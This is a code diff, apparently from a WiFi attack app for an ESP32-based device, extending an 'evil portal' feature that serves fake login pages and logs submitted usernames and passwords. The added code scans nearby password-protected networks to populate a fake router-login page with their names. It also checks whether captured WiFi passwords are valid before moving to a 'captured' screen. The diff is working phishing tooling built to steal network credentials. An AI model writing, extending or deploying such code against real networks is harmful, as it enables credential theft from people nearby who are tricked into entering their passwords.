@@ -8,11 +8,13 @@
 #include <datetime/datetime.h>
 #include <stdio.h>
 #include <string.h>
+#include <esp_wifi.h>
 
 static char* s_sd_html_buf = NULL;
 static size_t s_sd_html_len = 0;
 static File* s_cred_file = NULL;
 static Storage* s_storage = NULL;
+static char* s_router_options = NULL;
 
 static void evil_portal_cred_cb(const char* user, const char* pwd, void* ctx) {
     WifiApp* app = ctx;
@@ -30,6 +32,89 @@ static void evil_portal_cred_cb(const char* user, const char* pwd, void* ctx) {
     app->evil_portal_cred_head = next;
 
     view_dispatcher_send_custom_event(app->view_dispatcher, WifiAppCustomEventEvilPortalCredCaptured);
+}
+
+static void evil_portal_valid_cb(const char* ssid, const char* pwd, void* ctx) {
+    WifiApp* app = ctx;
+    if(!app) return;
+    strncpy(app->evil_portal_valid_ssid, ssid ? ssid : "", sizeof(app->evil_portal_valid_ssid) - 1);
+    app->evil_portal_valid_ssid[sizeof(app->evil_portal_valid_ssid) - 1] = 0;
+    strncpy(app->evil_portal_valid_pwd, pwd ? pwd : "", sizeof(app->evil_portal_valid_pwd) - 1);
+    app->evil_portal_valid_pwd[sizeof(app->evil_portal_valid_pwd) - 1] = 0;
+    view_dispatcher_send_custom_event(
+        app->view_dispatcher, WifiAppCustomEventEvilPortalCredsValid);
+}
+
+static void evil_portal_busy_cb(bool busy, const char* msg, void* ctx) {
+    WifiApp* app = ctx;
+    if(!app) return;
+    evil_portal_view_set_busy(app->evil_portal_view_obj, busy, msg);
+}
+
+static void evil_portal_action_cb(EvilPortalViewAction action, void* ctx) {
+    WifiApp* app = ctx;
+    uint32_t event = (action == EvilPortalViewActionConfig)
+                         ? WifiAppCustomEventEvilPortalConfig
+                         : WifiAppCustomEventEvilPortalTogglePause;
+    view_dispatcher_send_custom_event(app->view_dispatcher, event);
+}
+
+// Build "<option>SSID</option>" list from a scan, password-protected only.
+// Returns malloc'd string or NULL on empty/error. Caller frees.
+static char* build_router_ssid_options(void) {
+    if(!wifi_hal_is_started()) {
+        if(!wifi_hal_start()) return NULL;
+    }
+    wifi_ap_record_t* raw = NULL;
+    uint16_t count = 0;
+    wifi_hal_scan(&raw, &count, 32);
+
+    // Estimate buffer size and grow as needed.
+    size_t cap = 1024;
+    char* buf = malloc(cap);
+    if(!buf) {
+        if(raw) free(raw);
+        return NULL;
+    }
+    size_t off = 0;
+    buf[0] = 0;
+
+    for(uint16_t i = 0; i < count; i++) {
+        if(raw[i].authmode == WIFI_AUTH_OPEN) continue;
+        const char* ssid = (const char*)raw[i].ssid;
+        if(!ssid[0]) continue;
+
+        // Crude HTML escape: replace < > & " with HTML entities while writing.
+        char esc[160];
+        size_t e = 0;
+        for(size_t k = 0; ssid[k] && e + 7 < sizeof(esc); k++) {
+            char c = ssid[k];
+            if(c == '<') { memcpy(esc + e, "&lt;", 4); e += 4; }
+            else if(c == '>') { memcpy(esc + e, "&gt;", 4); e += 4; }
+            else if(c == '&') { memcpy(esc + e, "&amp;", 5); e += 5; }
+            else if(c == '"') { memcpy(esc + e, "&quot;", 6); e += 6; }
+            else if(c == '\'') { memcpy(esc + e, "&#39;", 5); e += 5; }
+            else { esc[e++] = c; }
+        }
+        esc[e] = 0;
+
+        size_t need = off + e * 2 + 32;
+        if(need >= cap) {
+            cap = need * 2;
+            char* nb = realloc(buf, cap);
+            if(!nb) { free(buf); if(raw) free(raw); return NULL; }
+            buf = nb;
+        }
+        int n = snprintf(buf + off, cap - off, "<option value=\"%s\">%s</option>", esc, esc);
+        if(n > 0) off += (size_t)n;
+    }
+
+    if(raw) free(raw);
+    if(off == 0) {
+        free(buf);
+        return NULL;
+    }
+    return buf;
 }
 
 static void sanitize_filename(const char* in, char* out, size_t out_size) {
@@ -153,12 +238,17 @@ void wifi_app_scene_evil_portal_run_on_enter(void* context) {
     evil_portal_view_set_last(app->evil_portal_view_obj, "");
     evil_portal_view_set_status(app->evil_portal_view_obj, "Starting...");
 
+    evil_portal_view_set_action_callback(
+        app->evil_portal_view_obj, evil_portal_action_cb, app);
+    evil_portal_view_set_paused(app->evil_portal_view_obj, false);
+
     view_dispatcher_switch_to_view(app->view_dispatcher, WifiAppViewEvilPortal);
 
     open_cred_file(app);
 
     const char* html = NULL;
     size_t html_len = 0;
+    bool verify = false;
     switch(app->evil_portal_template) {
     case WifiAppEvilPortalTemplateGoogle:
         html = EVIL_PORTAL_HTML_GOOGLE;
@@ -167,6 +257,14 @@ void wifi_app_scene_evil_portal_run_on_enter(void* context) {
     case WifiAppEvilPortalTemplateRouter:
         html = EVIL_PORTAL_HTML_ROUTER;
         html_len = EVIL_PORTAL_HTML_ROUTER_LEN;
+        verify = true;
+        evil_portal_view_set_busy(app->evil_portal_view_obj, true, "Scanning APs...");
+        if(s_router_options) {
+            free(s_router_options);
+            s_router_options = NULL;
+        }
+        s_router_options = build_router_ssid_options();
+        evil_portal_view_set_busy(app->evil_portal_view_obj, false, NULL);
         break;
     case WifiAppEvilPortalTemplateSd:
         if(load_sd_html(app->evil_portal_sd_path)) {
@@ -183,10 +281,16 @@ void wifi_app_scene_evil_portal_run_on_enter(void* context) {
     WifiHalEvilPortalConfig cfg = {
         .ssid = app->evil_portal_ssid,
         .channel = app->evil_portal_channel,
+        .verify_creds = verify,
         .html = html,
         .html_len = html_len,
+        .router_ssid_options = s_router_options,
         .cred_cb = evil_portal_cred_cb,
         .cred_cb_ctx = app,
+        .valid_cb = evil_portal_valid_cb,
+        .valid_cb_ctx = app,
+        .busy_cb = evil_portal_busy_cb,
+        .busy_cb_ctx = app,
     };
 
     if(!wifi_hal_evil_portal_start(&cfg)) {
@@ -201,11 +305,27 @@ bool wifi_app_scene_evil_portal_run_on_event(void* context, SceneManagerEvent ev
     bool consumed = false;
 
     if(event.type == SceneManagerEventTypeCustom) {
-        if(event.event == InputKeyOk || event.event == WifiAppCustomEventEvilPortalStop) {
+        if(event.event == WifiAppCustomEventEvilPortalStop ||
+           event.event == WifiAppCustomEventEvilPortalConfig) {
             scene_manager_previous_scene(app->scene_manager);
+            consumed = true;
+        } else if(event.event == WifiAppCustomEventEvilPortalTogglePause) {
+            if(wifi_hal_evil_portal_is_paused()) {
+                wifi_hal_evil_portal_resume();
+                evil_portal_view_set_paused(app->evil_portal_view_obj, false);
+                evil_portal_view_set_status(app->evil_portal_view_obj, "Running");
+            } else {
+                wifi_hal_evil_portal_pause();
+                evil_portal_view_set_paused(app->evil_portal_view_obj, true);
+                evil_portal_view_set_status(app->evil_portal_view_obj, "Paused");
+            }
             consumed = true;
         } else if(event.event == WifiAppCustomEventEvilPortalCredCaptured) {
             drain_cred_queue(app);
+            consumed = true;
+        } else if(event.event == WifiAppCustomEventEvilPortalCredsValid) {
+            drain_cred_queue(app);
+            scene_manager_next_scene(app->scene_manager, WifiAppSceneEvilPortalCaptured);
             consumed = true;
         }
     } else if(event.type == SceneManagerEventTypeTick) {
@@ -221,6 +341,7 @@ void wifi_app_scene_evil_portal_run_on_exit(void* context) {
     WifiApp* app = context;
     (void)app;
 
+    evil_portal_view_set_action_callback(app->evil_portal_view_obj, NULL, NULL);
     wifi_hal_evil_portal_stop();
     drain_cred_queue(app);
     close_cred_file();
@@ -229,5 +350,9 @@ void wifi_app_scene_evil_portal_run_on_exit(void* context) {
         free(s_sd_html_buf);
         s_sd_html_buf = NULL;
         s_sd_html_len = 0;
+    }
+    if(s_router_options) {
+        free(s_router_options);
+        s_router_options = NULL;
     }
 }
